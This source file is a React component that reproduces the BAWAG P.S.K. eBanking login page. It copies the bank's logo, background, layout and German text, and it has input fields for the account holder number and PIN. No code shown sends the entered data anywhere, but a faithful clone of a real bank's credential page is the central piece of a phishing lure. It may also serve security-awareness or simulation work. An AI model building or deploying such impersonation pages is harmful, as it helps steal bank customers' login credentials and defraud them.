import { useState } from "react";
import { Eye, EyeOff, HelpCircle, ShieldAlert, ChevronRight } from "lucide-react";
import bawagLogo from "@/assets/bawag_logo.png";
import bawagBg from "@/assets/bawag_background.jpg";

const Bawag = () => {
  const [verfueger, setVerfueger] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [loginTab, setLoginTab] = useState<"verfueger" | "app">("verfueger");

  const now = new Date();
  const days = ["Sonntag", "Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag"];
  const dateStr = `${days[now.getDay()]}, ${String(now.getDate()).padStart(2, "0")}.${String(now.getMonth() + 1).padStart(2, "0")}.${now.getFullYear()}, ${String(now.getHours()).padStart(2, "0")}:${String(now.getMinutes()).padStart(2, "0")}`;

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#f0f0f0]" style={{ fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif" }}>
      {/* Fixed 970px container */}
      <div className="w-[970px]">
        {/* Header */}
        <header className="bg-white border-b border-gray-200 px-4 py-2 flex items-center justify-between">
          <img src={bawagLogo} alt="BAWAG eBanking" className="h-8" />
          <span className="text-xs text-gray-500">{dateStr}</span>
          <div className="flex gap-1">
            {["DE", "EN", "BKS", "TR"].map((l) => (
              <button
                key={l}
                className={`px-2 py-0.5 text-[11px] font-semibold rounded transition-colors ${
                  l === "DE"
                    ? "bg-[#8b1a2b] text-white"
                    : "bg-gray-200 text-gray-600 hover:bg-gray-300"
                }`}
              >
                {l}
              </button>
            ))}
          </div>
        </header>

        {/* Background image container — fixed 970x490 */}
        <div
          className="relative w-[970px] h-[490px]"
          style={{
            backgroundImage: `url(${bawagBg})`,
            backgroundSize: "cover",
            backgroundPosition: "center top",
          }}
        >
          {/* Login Card — absolute positioned */}
          <div className="absolute top-5 left-5 w-[320px]">
            <div className="bg-white rounded shadow-sm">
              <div className="bg-[#8b1a2b] text-white px-4 py-2 rounded-t flex items-center justify-between">
                <h1 className="text-sm font-semibold">eBanking Login</h1>
                <HelpCircle className="h-4 w-4 opacity-80 cursor-pointer" />
              </div>

              <div className="p-4">
                <p className="text-xs text-gray-600 mb-3">Wie wollen Sie sich einloggen?</p>

                {/* Tabs */}
                <div className="flex mb-4 border border-gray-300 rounded overflow-hidden">
                  <button
                    onClick={() => setLoginTab("verfueger")}
                    className={`flex-1 py-1.5 text-xs font-semibold transition-colors ${
                      loginTab === "verfueger"
                        ? "bg-[#8b1a2b] text-white"
                        : "bg-white text-gray-700 hover:bg-gray-50"
                    }`}
                  >
                    Verfüger
                  </button>
                  <button
                    onClick={() => setLoginTab("app")}
                    className={`flex-1 py-1.5 text-xs font-semibold transition-colors ${
                      loginTab === "app"
                        ? "bg-[#8b1a2b] text-white"
                        : "bg-white text-gray-700 hover:bg-gray-50"
                    }`}
                  >
                    Mit der App
                  </button>
                </div>

                {loginTab === "verfueger" ? (
                  <>
                    <div className="mb-3">
                      <label className="block text-[11px] text-gray-500 mb-1">Verfügernummer</label>
                      <input
                        type="text"
                        value={verfueger}
                        onChange={(e) => setVerfueger(e.target.value)}
                        className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#8b1a2b]"
                      />
                    </div>

                    <div className="mb-3">
                      <label className="block text-[11px] text-gray-500 mb-1">
                        PIN <span className="text-gray-400">(8 bis 16-stellig)</span>
                      </label>
                      <div className="relative">
                        <input
                          type={showPin ? "text" : "password"}
                          value={pin}
                          onChange={(e) => setPin(e.target.value)}
                          className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs pr-8 focus:outline-none focus:ring-1 focus:ring-[#8b1a2b]"
                        />
                        <button
                          type="button"
                          onClick={() => setShowPin(!showPin)}
                          className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                        >
                          {showPin ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
                        </button>
                      </div>
                    </div>

                    <button className="w-full py-1.5 bg-[#8b1a2b] text-white text-xs font-semibold rounded hover:bg-[#721525] transition-colors mb-3">
                      Login
                    </button>
                  </>
                ) : (
                  <>
                    <p className="text-xs text-gray-600 mb-2">
                      Verwenden Sie Ihre für die BAWAG App registrierte E-Mail oder Ihre Verfügernummer.
                    </p>
                    <div className="mb-3">
                      <label className="block text-[11px] text-gray-500 mb-1">E-Mail ODER Verfügernummer</label>
                      <input
                        type="text"
                        className="w-full border border-gray-300 rounded px-2 py-1.5 text-xs focus:outline-none focus:ring-1 focus:ring-[#8b1a2b]"
                      />
                    </div>
                    <button className="w-full py-1.5 bg-[#8b1a2b] text-white text-xs font-semibold rounded hover:bg-[#721525] transition-colors mb-3">
                      Weiter
                    </button>
                  </>
                )}

                <div className="border-t pt-3">
                  <a href="#" className="text-[11px] text-[#c20016] hover:underline flex items-center gap-1">
                    <ChevronRight className="h-3 w-3" />
                    PIN vergessen oder Verfüger gesperrt?
                  </a>
                </div>
              </div>
            </div>
          </div>

          {/* Info Card — absolute positioned top right */}
          <div className="absolute top-5 left-[355px] right-5">
            <div className="bg-white rounded shadow-sm">
              <div className="grid grid-cols-3 divide-x divide-gray-200">
                <div className="p-3">
                  <h2 className="font-bold text-[11px] mb-2 flex items-center gap-1">
                    <ShieldAlert className="h-3.5 w-3.5 text-[#c20016]" />
                    Sicherheit
                  </h2>
                  <p className="text-[10px] text-gray-600 leading-relaxed">
                    Die BAWAG versendet keine E-Mails mit direkten eBanking Login-Links!
                  </p>
                  <a href="#" className="text-[10px] text-[#c20016] hover:underline mt-1 inline-block">
                    Mehr Infos
                  </a>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-[11px] mb-2">Service & Info</h2>
                  <ul className="space-y-1">
                    <li><a href="#" className="text-[10px] text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Sicherheitsregeln</a></li>
                    <li><a href="#" className="text-[10px] text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Anmeldung / Erste Schritte</a></li>
                    <li><a href="#" className="text-[10px] text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />3D Secure Online Bezahlung</a></li>
                  </ul>
                </div>

                <div className="p-3">
                  <h2 className="font-bold text-[11px] mb-2">Support</h2>
                  <ul className="space-y-1">
                    <li><a href="#" className="text-[10px] text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />FAQ</a></li>
                    <li><a href="#" className="text-[10px] text-[#c20016] hover:underline flex items-center gap-0.5"><ChevronRight className="h-2.5 w-2.5" />Zu Watchlist Internet</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer — directly under the image */}
        <footer className="bg-white border-t border-gray-200 py-3 px-4">
          <div className="flex flex-wrap gap-3 justify-center mb-1">
            {["Impressum", "AGB", "Datenschutz", "Nutzungsbedingungen", "Barrierefrei"].map((item) => (
              <a key={item} href="#" className="text-[10px] text-[#c20016] hover:underline">
                {item}
              </a>
            ))}
          </div>
          <p className="text-[10px] text-gray-500 text-center">© BAWAG P.S.K.</p>
        </footer>
      </div>
    </div>
  );
};

export default Bawag;
